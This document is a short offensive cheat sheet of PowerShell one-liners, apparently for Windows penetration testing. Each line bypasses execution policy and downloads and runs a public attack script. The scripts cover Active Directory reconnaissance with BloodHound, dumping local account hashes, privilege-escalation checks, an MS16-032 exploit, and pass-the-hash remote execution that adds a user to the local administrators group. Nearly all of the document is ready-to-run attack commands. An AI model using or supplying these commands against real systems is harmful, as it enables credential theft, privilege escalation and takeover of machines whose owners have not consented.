# PowerShell One-Liners

Bloodhound : Using ingestors to collect the data and then send it to BloodHound.

```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound"
```

PowerDump : Dump all local accounts.

```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump"
```

PowerUp : Check for privilege escalation.

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks"
```

Sherlock : An old tool to find vulnerabilities on the host. Can be still interesting.

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Find-AllVulns"
```

To exploit one of those vulnerabilities via Sherlock, for example MS16-032 :

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Invoke-MS16-032"
```

Invoke-SMBExec : Remote command execution by using a hash :
```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-SMBExec.ps1’);"
Invoke-SMBExec -hash HASH -Target HOSTNAME -Domain DOMAIN -Username USERNAME -Command “net localgroup Administrateurs USERNAME /ADD” -verbose
```
